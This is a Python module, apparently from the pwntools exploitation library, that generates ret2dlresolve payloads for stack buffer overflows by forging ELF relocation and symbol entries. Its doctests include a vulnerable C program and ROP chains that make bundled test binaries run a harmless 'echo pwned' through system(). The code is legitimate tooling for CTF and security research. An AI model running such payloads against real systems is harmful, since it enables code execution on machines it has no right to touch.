r"""
Provides automatic payload generation for exploiting buffer overflows
using ret2dlresolve.

We use the following example program:

::

    #include <unistd.h>
    void vuln(void){
        char buf[64];
        read(STDIN_FILENO, buf, 200);
    }
    int main(int argc, char** argv){
        vuln();
    }

We can automate the  process of exploitation with these some example binaries.
    
    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
    >>> rop = ROP(context.binary)
    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
    >>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
    >>> rop.ret2dlresolve(dlresolve)
    >>> raw_rop = rop.chain()
    >>> print(rop.dump())
    0x0000:        0x80482e0 read(0, 0x804ae00)
    0x0004:        0x80484ea <adjust @0x10> pop edi; pop ebp; ret
    0x0008:              0x0 arg0
    0x000c:        0x804ae00 arg1
    0x0010:        0x80482d0 [plt_init] system(0x804ae24)
    0x0014:           0x2b84 [dlresolve index]
    0x0018:          b'gaaa' <return address>
    0x001c:        0x804ae24 arg0
    >>> p = elf.process()
    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
    >>> p.recvline()
    b'pwned\n'

You can also use ``Ret2dlresolve`` on AMD64:

    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
    >>> rop = ROP(elf)
    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
    >>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
    >>> rop.ret2dlresolve(dlresolve)
    >>> raw_rop = rop.chain()
    >>> print(rop.dump())
    0x0000:         0x400593 pop rdi; ret
    0x0008:              0x0 [arg0] rdi = 0
    0x0010:         0x400591 pop rsi; pop r15; ret
    0x0018:         0x601e00 [arg1] rsi = 6299136
    0x0020:      b'iaaajaaa' <pad r15>
    0x0028:         0x4003f0 read
    0x0030:         0x400593 pop rdi; ret
    0x0038:         0x601e48 [arg0] rdi = 6299208
    0x0040:         0x4003e0 [plt_init] system
    0x0048:          0x15670 [dlresolve index]
    >>> p = elf.process()
    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
    >>> if dlresolve.unreliable:
    ...     p.poll(True) == -signal.SIGSEGV
    ... else:
    ...     p.recvline() == b'pwned\n'
    True
"""

import six
from copy import deepcopy

from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.util.packing import *
from pwnlib.util.packing import _encode
from pwnlib.util.misc import align

log = getLogger(__name__)

ELF32_R_SYM_SHIFT = 8
ELF64_R_SYM_SHIFT = 32

class Elf32_Rel(object):
    ''
    """
    .. code-block:: c

        typedef struct elf32_rel {
            Elf32_Addr	r_offset;
            Elf32_Word	r_info;
        } Elf32_Rel;
    """
    size=1 # see _build_structures method for explanation
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

    def __flat__(self):
        return p32(self.r_offset) + p32(self.r_info)

    def __bytes__(self):
        return self.__flat__()


class Elf64_Rel(object):
    ''
    """
    .. code-block:: c

        typedef struct elf64_rel {
            Elf64_Addr r_offset;
            Elf64_Xword r_info;
        } Elf64_Rel;
    """
    size=24
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

    def __flat__(self):
        return p64(self.r_offset) + p64(self.r_info) + p64(0)

    def __bytes__(self):
        return self.__flat__()


class Elf32_Sym(object):
    ''
    """
    .. code-block:: c

        typedef struct elf32_sym{
            Elf32_Word	st_name;
            Elf32_Addr	st_value;
            Elf32_Word	st_size;
            unsigned char	st_info;
            unsigned char	st_other;
            Elf32_Half	st_shndx;
        } Elf32_Sym;
    """
    size = 16
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

    def __flat__(self):
        return p32(self.st_name) + \
            p32(self.st_value) + \
            p32(self.st_size) + \
            p8(self.st_info) + \
            p8(self.st_other) + \
            p16(self.st_shndx)

    def __bytes__(self):
        return self.__flat__()


class Elf64_Sym(object):
    ''
    """
    .. code-block:: c

        typedef struct elf64_sym {
            Elf64_Word st_name;
            unsigned char	st_info;
            unsigned char	st_other;
            Elf64_Half st_shndx;
            Elf64_Addr st_value;
            Elf64_Xword st_size;
        } Elf64_Sym;
    """
    size=24
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

    def __flat__(self):
        return p32(self.st_name) + \
            p8(self.st_info) + \
            p8(self.st_other) + \
            p16(self.st_shndx) + \
            p64(self.st_value) + \
            p64(self.st_size)

    def __bytes__(self):
        return self.__flat__()


class Queue(list):
    ''
    def size(self):
        size = 0
        for v in self:
            # Lists, strings and ints all have size context.size
            # Assuming int size equals address size
            if isinstance(v, MarkedBytes):
                size += len(v)
            else:
                size += context.bytes
        return size


class MarkedBytes(bytes):
    ''
    pass


class Ret2dlresolvePayload(object):
    """Create a ret2dlresolve payload

    Arguments:
        elf (ELF): Binary to search
        symbol (str): Function to search for
        args (list): List of arguments to pass to the function

    Returns:
        A ``Ret2dlresolvePayload`` object which can be passed to ``rop.ret2dlresolve``
    """
    def __init__(self, elf, symbol, args, data_addr=None):
        self.elf = elf
        self.elf_load_address_fixup = self.elf.address - self.elf.load_addr
        self.strtab = elf.dynamic_value_by_tag("DT_STRTAB") + self.elf_load_address_fixup
        self.symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + self.elf_load_address_fixup
        self.jmprel = elf.dynamic_value_by_tag("DT_JMPREL") + self.elf_load_address_fixup
        self.versym = elf.dynamic_value_by_tag("DT_VERSYM") + self.elf_load_address_fixup
        self.symbol = _encode(symbol)
        self.args = args
        self.real_args = self._format_args()
        self.unreliable = False

        self.data_addr = data_addr if data_addr is not None else self._get_recommended_address()

        # Will be set when built
        self.reloc_index = -1
        self.payload = b""

        # PIE is untested, gcc forces FULL-RELRO when PIE is set
        if self.elf.pie and self.elf_load_address_fixup == 0:
            log.warning("WARNING: ELF is PIE but has no base address set")

        self._build()

    def _format_args(self):
        # Encode every string in args
        def aux(args):
            for i, arg in enumerate(args):
                if isinstance(arg, (str,bytes)):
                    args[i] = _encode(args[i]) + b"\x00"
                elif isinstance(arg, (list, tuple)):
                    aux(arg)

        args = deepcopy(self.args)
        aux(args)
        return args

    def _get_recommended_address(self):
        bss = self.elf.get_section_by_name(".bss").header.sh_addr + self.elf_load_address_fixup
        bss_size = self.elf.get_section_by_name(".bss").header.sh_size
        addr = bss + bss_size
        addr = addr + (-addr & 0xfff) - 0x200 #next page in memory - 0x200
        return addr

    def _build_structures(self):
        # The first part of the payload is the usual of ret2dlresolve.
        if context.bits == 32:
            ElfSym = Elf32_Sym
            ElfRel = Elf32_Rel
            ELF_R_SYM_SHIFT = ELF32_R_SYM_SHIFT
        elif context.bits == 64:
            ElfSym = Elf64_Sym
            ElfRel = Elf64_Rel
            ELF_R_SYM_SHIFT = ELF64_R_SYM_SHIFT
        else:
            log.error("Unsupported bits")

        # where the address of the symbol will be saved
        # (ElfRel.r_offset points here)
        symbol_space = b"A"*context.bytes

        # Symbol name. Ej: system
        symbol_name_addr = self.data_addr + len(self.payload)
        symbol_name = self.symbol + b"\x00"
        symbol_end_addr = symbol_name_addr + len(symbol_name)

        # ElfSym
        index = align(ElfSym.size, symbol_end_addr - self.symtab) // ElfSym.size # index for both symtab and versym
        sym_addr = self.symtab + ElfSym.size * index
        sym = ElfSym(st_name=symbol_name_addr - self.strtab)
        sym_end_addr = sym_addr + sym.size

        # It seems to be treated as an index in 64b and
        # as an offset in 32b. That's why Elf32_Rel.size = 1
        self.reloc_index = align(ElfRel.size, sym_end_addr - self.jmprel) // ElfRel.size

        # ElfRel
        rel_addr = self.jmprel + self.reloc_index * ElfRel.size
        rel_type = 7
        rel = ElfRel(r_offset=self.data_addr, r_info=(index<<ELF_R_SYM_SHIFT)+rel_type)

        self.payload = fit({
            symbol_name_addr - self.data_addr: symbol_name,
            sym_addr - self.data_addr: sym,
            rel_addr - self.data_addr: rel
        })

        ver_addr = self.versym + 2 * index # Elf_HalfWord

        log.debug("Symtab: %s", hex(self.symtab))
        log.debug("Strtab: %s", hex(self.strtab))
        log.debug("Versym: %s", hex(self.versym))
        log.debug("Jmprel: %s", hex(self.jmprel))
        log.debug("ElfSym addr: %s", hex(sym_addr))
        log.debug("ElfRel addr: %s", hex(rel_addr))
        log.debug("Symbol name addr: %s", hex(symbol_name_addr))
        log.debug("Version index addr: %s", hex(ver_addr))
        log.debug("Data addr: %s", hex(self.data_addr))
        if not self.elf.memory[ver_addr]:
            log.warn("Ret2dlresolve is likely impossible in this ELF "
                     "(too big gap between text and writable sections).\n"
                     "If you get a segmentation fault with fault_addr = %#x, "
                     "try a different technique.", ver_addr)
            self.unreliable = True

    def _build_args(self):
        # The second part of the payload will include strings and pointers needed for ROP.
        queue = Queue()

        # We first have to process the arguments: replace lists and strings with
        # pointers to the payload. Add lists contents and marked strings to the queue
        # to be processed later.
        for i, arg in enumerate(self.real_args):
            if isinstance(arg, (list, tuple)):
                self.real_args[i] = self.data_addr + len(self.payload) + queue.size()
                queue.extend(arg)
            elif isinstance(arg, bytes):
                self.real_args[i] = self.data_addr + len(self.payload) + queue.size()
                queue.append(MarkedBytes(arg))

        # Now we process the generated queue, which contains elements that will be in
        # the payload. We replace lists and strings with pointers, add lists elements
        # to the queue, and mark strings so next time they are processed they are
        # added and not replaced again.
        while len(queue) > 0:
            top = queue[0]
            if isinstance(top, (list, tuple)):
                top = pack(self.data_addr + len(self.payload) + queue.size())
                queue.extend(queue[0])
            elif isinstance(top, MarkedBytes):
                # Just add them
                pass
            elif isinstance(top, bytes):
                top = pack(self.data_addr + len(self.payload) + queue.size())
                queue.append(MarkedBytes(queue[0]))
            elif isinstance(top, six.integer_types):
                top = pack(top)

            self.payload += top
            queue.pop(0)

    def _build(self):
        self._build_structures()
        self._build_args()
